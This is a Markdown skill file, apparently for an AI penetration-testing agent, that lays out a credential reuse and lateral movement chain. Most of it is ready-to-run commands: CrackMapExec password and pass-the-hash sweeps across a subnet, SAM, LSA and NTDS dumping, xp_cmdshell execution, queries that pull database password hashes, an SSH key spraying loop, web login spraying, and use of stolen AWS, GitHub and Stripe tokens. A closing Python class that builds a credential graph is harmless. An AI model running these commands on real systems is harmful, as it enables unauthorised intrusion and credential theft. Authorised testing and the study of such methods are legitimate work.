# /credential-reuse — Credential Reuse & Automated Harvest Chains

> **Skill type:** Post-Exploitation / Lateral Movement  
> **Source:** 0xsteph/pentest-ai-agents credential chain, CrackMapExec methodology  
> **Chains into:** `/ad-assessment`, `/cloud-security`, `/lateral-movement`  
> **Chained from:** `/post-exploit` (credential discovery)

---

## Purpose

Take discovered credentials and systematically test them across all services, protocols, and applications. Build a credential graph: what each set of credentials unlocks, and how they chain into further compromise.

---

## The Credential Reuse Loop

```
Discover credential
       ↓
Test across all known services
       ↓
Gain new access
       ↓
Find more credentials in new access
       ↓
Repeat until all paths exhausted
```

---

## Phase 1: Credential Inventory

```bash
# Collect all discovered credentials into a structured file
# Format: type:username:password:source
cat > creds.txt << EOF
password:admin:Admin@123:webapp-login-form
hash:DOMAIN\jsmith:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:lsass-dump
hash:localadmin:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:sam-dump
key:/root/.ssh/id_rsa:ssh-key:found-in-/home/deploy/.ssh/
api_key:AKIAIOSFODNN7EXAMPLE:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY:env-file
password:db_user:P@ssw0rd!:database-config
EOF

# Deduplicate and organize
sort -u creds.txt > creds-deduped.txt
```

---

## Phase 2: Network-Wide Password Testing (CrackMapExec)

```bash
# Test across SMB (Windows hosts)
crackmapexec smb 10.0.0.0/24 -u admin -p 'Admin@123' --continue-on-success
crackmapexec smb 10.0.0.0/24 -u admin -p 'Admin@123' -x "whoami" --continue-on-success

# Test with NTLM hash (PTH)
crackmapexec smb 10.0.0.0/24 -u Administrator -H "NTLM_HASH" --local-auth

# Test WinRM (Windows Remote Management, port 5985)
crackmapexec winrm 10.0.0.0/24 -u admin -p 'Admin@123'

# Test MSSQL
crackmapexec mssql 10.0.0.0/24 -u sa -p 'Admin@123'
crackmapexec mssql 10.0.0.0/24 -u sa -p 'Admin@123' -x "xp_cmdshell whoami" --no-bruteforce

# Test SSH
crackmapexec ssh 10.0.0.0/24 -u deploy -p 'Admin@123'

# Test RDP
crackmapexec rdp 10.0.0.0/24 -u admin -p 'Admin@123'

# Test LDAP (Active Directory)
crackmapexec ldap 10.0.0.0/24 -u jsmith -p 'Admin@123' --kdcHost DC_IP

# Dump SAM on all successful SMB hosts
crackmapexec smb SUCCESSFUL_HOSTS -u admin -p 'Admin@123' --sam
crackmapexec smb SUCCESSFUL_HOSTS -u admin -p 'Admin@123' --lsa  # LSA secrets
crackmapexec smb SUCCESSFUL_HOSTS -u admin -H HASH --ntds  # NTDS.dit on DCs
```

---

## Phase 3: Service-Specific Testing

```bash
# Database services
# MySQL
mysql -h TARGET -u root -p'Admin@123' -e "show databases;"
mysql -h TARGET -u root -p'Admin@123' -e "select user,password from mysql.user;"

# PostgreSQL
psql -h TARGET -U postgres -c "\l"  # List databases
psql -h TARGET -U postgres -c "SELECT username, passwd FROM pg_shadow;"

# MSSQL → xp_cmdshell for RCE
python3 -c "
from impacket.tds import MSSQL
ms = MSSQL('TARGET', 1433)
ms.connect()
ms.login(None, 'sa', 'Admin@123', None, None, None)
ms.sql_query('EXEC xp_cmdshell \"whoami\"')
"

# MongoDB (check auth)
mongo TARGET:27017 --eval "db.adminCommand({listDatabases: 1})"
mongo TARGET:27017 --username admin --password Admin@123 --eval "db.users.find()"

# Redis
redis-cli -h TARGET ping  # No auth
redis-cli -h TARGET -a Admin@123 keys "*"
redis-cli -h TARGET -a Admin@123 get "session:*"  # Session hijacking!
```

---

## Phase 4: SSH Key Propagation

```bash
# If SSH key found, test across all discovered hosts
cat found_private_key > /tmp/test_key && chmod 600 /tmp/test_key

# Test key against all discovered hosts
for host in $(cat live-hosts.txt); do
  for user in root admin ubuntu ec2-user deploy deployer git www-data; do
    result=$(ssh -i /tmp/test_key -o StrictHostKeyChecking=no \
      -o ConnectTimeout=5 -o BatchMode=yes \
      $user@$host "id" 2>/dev/null)
    [ -n "$result" ] && echo "SUCCESS: $user@$host → $result"
  done
done

# Known_hosts → find connected hosts
cat ~/.ssh/known_hosts  # Lists all hosts this key has connected to
# Parse for IPs/hostnames → expand scope of testing
```

---

## Phase 5: Web Application Credential Reuse

```bash
# Test discovered credentials across all web apps found in recon
WEB_APPS=(
  "https://admin.target.com/login"
  "https://target.com/wp-admin"
  "https://jenkins.target.com/login"
  "https://grafana.target.com/login"
  "https://gitlab.target.com/users/sign_in"
  "https://jira.target.com/login"
  "https://confluence.target.com/login"
)

for app in "${WEB_APPS[@]}"; do
  echo "[*] Testing $app"
  # Adapt form fields per application
  curl -s -X POST "$app" \
    -d "username=admin&password=Admin@123" \
    -c /tmp/cookies.txt \
    -w "%{http_code}" -o /dev/null
done

# API authentication testing
for endpoint in /api/login /api/v1/auth /api/v2/token /auth/token; do
  result=$(curl -s -X POST "https://target.com$endpoint" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"Admin@123"}' \
    -w "\n%{http_code}")
  code=$(echo "$result" | tail -1)
  body=$(echo "$result" | head -n -1)
  [ "$code" == "200" ] && echo "SUCCESS: $endpoint" && echo "$body" | head -c 200
done
```

---

## Phase 6: Cloud Service Testing

```bash
# AWS — test access keys discovered in config files / source code
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
aws sts get-caller-identity  # Who are we?
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)

# GitHub token
curl -H "Authorization: token ghp_XXXXX" https://api.github.com/user
curl -H "Authorization: token ghp_XXXXX" https://api.github.com/orgs/TARGET_ORG/repos

# Slack webhook/token
curl -H "Authorization: Bearer xoxb-SLACK_TOKEN" \
  https://slack.com/api/auth.test

# Stripe (payment processor) — READ ONLY TEST ONLY
curl -u "sk_live_XXXXXXXXXX:" https://api.stripe.com/v1/customers?limit=3

# Sendgrid
curl -H "Authorization: Bearer SG.XXXXXXXXXX" https://api.sendgrid.com/v3/user/profile
```

---

## Credential Graph Builder

```python
#!/usr/bin/env python3
"""Build a credential access graph showing what each credential unlocks."""

import json
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class CredentialNode:
    id: str
    type: str  # password, hash, key, api_key
    username: str
    secret: str
    source: str  # where it was found
    unlocks: List[str] = field(default_factory=list)  # what it gives access to
    confidence: float = 1.0

@dataclass
class AccessNode:
    id: str
    type: str  # ssh, smb, database, web_app, cloud
    target: str
    privilege_level: str  # user, admin, root, cloud-admin
    credentials_found: List[str] = field(default_factory=list)  # found in this access

class CredentialGraph:
    def __init__(self):
        self.credentials: Dict[str, CredentialNode] = {}
        self.access_nodes: Dict[str, AccessNode] = {}
        self.edges: List[tuple] = []  # (cred_id, access_id)
    
    def add_credential(self, cred: CredentialNode):
        self.credentials[cred.id] = cred
    
    def add_access(self, access: AccessNode):
        self.access_nodes[access.id] = access
        # Link credentials to access
        for cred_id in access.credentials_found:
            if cred_id in self.credentials:
                self.edges.append((cred_id, access.id))
    
    def find_escalation_paths(self) -> List[List[str]]:
        """Find all paths from initial access to highest privilege."""
        # BFS from initial access nodes to admin/root nodes
        paths = []
        admin_nodes = [
            nid for nid, n in self.access_nodes.items()
            if n.privilege_level in ['admin', 'root', 'cloud-admin', 'domain-admin']
        ]
        return admin_nodes  # Simplified — full BFS in production
    
    def to_report(self) -> str:
        report = "## Credential Graph\n\n"
        report += f"Total credentials discovered: {len(self.credentials)}\n"
        report += f"Total access points unlocked: {len(self.access_nodes)}\n\n"
        for access_id, access in self.access_nodes.items():
            report += f"- **{access.target}** ({access.type}) — {access.privilege_level}\n"
        return report
```
